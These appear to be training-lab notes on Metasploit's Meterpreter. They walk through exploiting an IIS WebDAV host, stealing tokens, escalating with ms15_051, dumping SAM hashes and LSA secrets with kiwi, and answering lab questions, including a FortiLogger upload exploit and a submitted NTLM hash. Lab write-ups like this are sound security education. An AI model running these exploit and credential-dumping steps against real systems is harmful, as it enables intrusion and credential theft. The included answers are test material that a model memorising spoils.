# Meterpreter
The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
## Using Meterpreter
**MSF - Scanning Target**
```
msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15

[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-03 09:55 UTC
[*] Nmap: Nmap scan report for 10.10.10.15
[*] Nmap: Host is up (0.021s latency).
[*] Nmap: Not shown: 65534 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 6.0
[*] Nmap: | http-methods:
[*] Nmap: |_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
[*] Nmap: |_http-server-header: Microsoft-IIS/6.0
[*] Nmap: |_http-title: Under Construction
[*] Nmap: | http-webdav-scan:
[*] Nmap: |   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
[*] Nmap: |   WebDAV type: Unknown
[*] Nmap: |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
[*] Nmap: |   Server Date: Thu, 03 Sep 2020 09:56:46 GMT
[*] Nmap: |_  Server Type: Microsoft-IIS/6.0
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 59.74 seconds


msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.15             Unknown                    device         


msf6 > services

Services
========

host         port  proto  name  state  info
----         ----  -----  ----  -----  ----
10.10.10.15  80    tcp    http  open   Microsoft IIS httpd 6.0
```
We notice that the server is running Microsoft IIS httpd 6.0. So we further our research in that direction, searching for common vulnerabilities for this version of IIS. After some searching, we find the following marker for a widespread vulnerability: CVE-2017-7269. It also has a Metasploit module developed for it.

**MSF - Searching for Exploit**
```
msf6 > search iis_webdav_upload_asp

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/windows/iis/iis_webdav_upload_asp  2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution


msf6 > use 0

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/iis/iis_webdav_upload_asp) > show options

Module options (exploit/windows/iis/iis_webdav_upload_asp):

   Name          Current Setting        Required  Description
   ----          ---------------        --------  -----------
   HttpPassword                         no        The HTTP password to specify for authentication
   HttpUsername                         no        The HTTP username to specify for authentication
   METHOD        move                   yes       Move or copy the file on the remote system from .txt -> .asp (Accepted: move, copy)
   PATH          /metasploit%RAND%.asp  yes       The path to attempt to upload
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80                     yes       The target port (TCP)
   SSL           false                  no        Negotiate SSL/TLS for outgoing connections
   VHOST                                no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
**MSF - Configuring Exploit & Payload**
```
msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15

RHOST => 10.10.10.15


msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/iis/iis_webdav_upload_asp) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Checking /metasploit28857905.asp
[*] Uploading 612435 bytes to /metasploit28857905.txt...
[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...
[*] Executing /metasploit28857905.asp...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Deleting /metasploit28857905.asp (this doesn't always work)...
[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]
[*] Meterpreter session 1 opened (10.10.14.26:4444 -> 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000

meterpreter > 
```
We proceed further with our exploits. Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.

**MSF - Meterpreter Migration**
```
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.


meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 216   1080  cidaemon.exe                                                    
 272   4     smss.exe                                                        
 292   1080  cidaemon.exe                                                    
<...SNIP...>

 1712  396   alg.exe                                                         
 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1920  396   dllhost.exe                                                     
 2232  3552  svchost.exe        x86   0                                      C:\WINDOWS\Temp\rad9E519.tmp\svchost.exe
 2312  592   wmiprvse.exe                                                    
 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3624  592   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 4076  1080  cidaemon.exe                                                    


meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE


meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```
Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the `C:\Inetpub\` location, we find an interesting folder named `AdminScripts`. However, unfortunately, we do not have permission to read what is inside it.

We can easily decide to run the local exploit suggester module, attaching it to the currently active Meterpreter session. To do so, we background the current Meterpreter session, search for the module we need, and set the SESSION option to the index number for the Meterpreter session, binding the module to it.

**MSF - Session Handling**
```
meterpreter > bg

Background session 1? [y/N]  y


msf6 exploit(windows/iis/iis_webdav_upload_asp) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


msf6 exploit(windows/iis/iis_webdav_upload_asp) > use 0
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1

SESSION => 1


msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 34 exploit checks are being tried...
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```
Running the recon module presents us with a multitude of options. Going through each separate one, we land on the `ms15_051_client_copy_image` entry, which proves to be successful. This exploit lands us directly within a root shell, giving us total control over the target system.

**MSF - Privilege Escalation**
```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_images

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp


msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1

session => 1


msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0

LHOST => tun0


msf6 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.26:4444 
[*] Launching notepad to host the exploit...
[+] Process 844 launched.
[*] Reflectively injecting the exploit DLL into 844...
[*] Injecting exploit into 844...
[*] Exploit injected. Injecting payload into 844...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.26:4444 -> 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```
From here, we can proceed to use the plethora of Meterpreter functionalities. For example, extracting hashes, impersonating any process we want, and others.

**MSF - Dumping Hashes**
```
meterpreter > hashdump

Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::


meterpreter > lsa_dump_sam

[+] Running as SYSTEM
[*] Dumping SAM
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb
Local SID : S-1-5-21-1709780765-3897210020-3926566182

SAMKey : 37ceb48682ea1b0197c7ab294ec405fe

RID  : 000001f4 (500)
User : Administrator
  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf
  Hash NTLM: d6908f022af0373e9e21b8a241c86dca

RID  : 000001f5 (501)
User : Guest

RID  : 000003e9 (1001)
User : SUPPORT_388945a0
  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6

RID  : 000003eb (1003)
User : IUSR_GRANPA
  Hash LM  : a274b4532c9ca5cdf684351fab962e86
  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88

RID  : 000003ec (1004)
User : IWAM_GRANPA
  Hash LM  : 95d112c4da2348b599183ac6b1d67840
  Hash NTLM: a97f39734c21b3f6155ded7821d04d16

RID  : 000003ef (1007)
User : ASPNET
  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b
  Hash NTLM: edc0d5506804653f58964a2376bbd769

RID  : 000003f1 (1009)
User : Lakis
  Hash LM  : f927b0679b3cc0e192410d9b0b40873c
  Hash NTLM: 3064b6fc432033870c6730228af7867c
```
**MSF - Meterpreter LSA Secrets Dump**
```
meterpreter > lsa_dump_secrets

[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : GRANNY
SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb

Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )
Domain name : HTB

Policy subsystem is : 1.7
LSA Key : ada60ee248094ce782807afae1711b2c

Secret  : aspnet_WP_PASSWORD
cur/text: Q5C'181g16D'=F

Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV
cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 
    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63
    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63

Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75
cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588
cur/hex : 00 f2 d1 31 e2 11 d3 01 

Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d

Secret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}
cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f 
old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 

Secret  : NL$KM
cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f 

Secret  : SAC

Secret  : SAI

Secret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}

Secret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}

Secret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\LocalService

Secret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\LocalService

Secret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\NetworkService

Secret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\NetworkService

Secret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\LocalService

Secret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\NetworkService

Secret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\NetworkService

Secret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\LocalService

Secret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\LocalService

Secret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\LocalService
```
## Questions
1. Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with? **Answer: nt authority\system**
   - Perform a nmap scan and notice the target is using a vulnerable FortiLogger version:
        ```
        msf6> db_nmap -sVC 10.129.146.250
        5000/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        [*] Nmap: |_http-title: FortiLogger | Log and Report System
        ```
   - Found this exploit module `exploit(windows/http/fortilogger_arbitrary_fileupload)` and use it to exploit the target:
        ```
        [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set RHOSTS 10.129.146.250
        RHOSTS => 10.129.146.250
        [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> set LHOST 10.10.14.80
        LHOST => 10.10.14.80
        [msf](Jobs:0 Agents:0) exploit(windows/http/fortilogger_arbitrary_fileupload) >> exploit
        [*] Started reverse TCP handler on 10.10.14.80:4444 
        [*] Running automatic check ("set AutoCheck false" to disable)
        [+] The target is vulnerable. FortiLogger version 4.4.2.2
        [+] Generate Payload
        [+] Payload has been uploaded
        [*] Executing payload...
        [*] Sending stage (177734 bytes) to 10.129.146.250
        [*] Meterpreter session 1 opened (10.10.14.80:4444 -> 10.129.146.250:49686) at 2025-10-01 22:58:10 -0500

        (Meterpreter 1)(C:\Windows\system32) > shell
        Process 6516 created.
        Channel 1 created.
        Microsoft Windows [Version 10.0.17763.2628]
        (c) 2018 Microsoft Corporation. All rights reserved.

        C:\Windows\system32>whoami
        whoami
        nt authority\system
        ```
1. Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer. **Answer: cf3a5525ee9414229e66279623ed5c58**
   - From the above meterpreter shell, use this command to impersonate any process we want and dump SAM:
        ```
        (Meterpreter 2)(C:\Windows\system32) > lsa_dump_sam
        [-] The "lsa_dump_sam" command requires the "kiwi" extension to be loaded (run: `load kiwi`)
        (Meterpreter 2)(C:\Windows\system32) > load kiwi
        Loading extension kiwi...
        .#####.   mimikatz 2.2.0 20191125 (x86/windows)
        .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
        ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
        ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
        '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
        '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

        [!] Loaded x86 Kiwi on an x64 architecture.

        Success.
        (Meterpreter 2)(C:\Windows\system32) > lsa_dump_sam
        [+] Running as SYSTEM
        [*] Dumping SAM
        Domain : WIN-51BJ97BCIPV
        SysKey : c897d22c1c56490b453e326f86b2eef8
        Local SID : S-1-5-21-2348711446-3829538955-3974936019

        SAMKey : e52d743c76043bf814df6e48f1efcb23

        RID  : 000001f4 (500)
        User : Administrator
        Hash NTLM: bdaffbfe64f1fc646a3353be1c2c3c99
        ...
        RID  : 000003ea (1002)
        User : htb-student
        Hash NTLM: cf3a5525ee9414229e66279623ed5c58
        ```
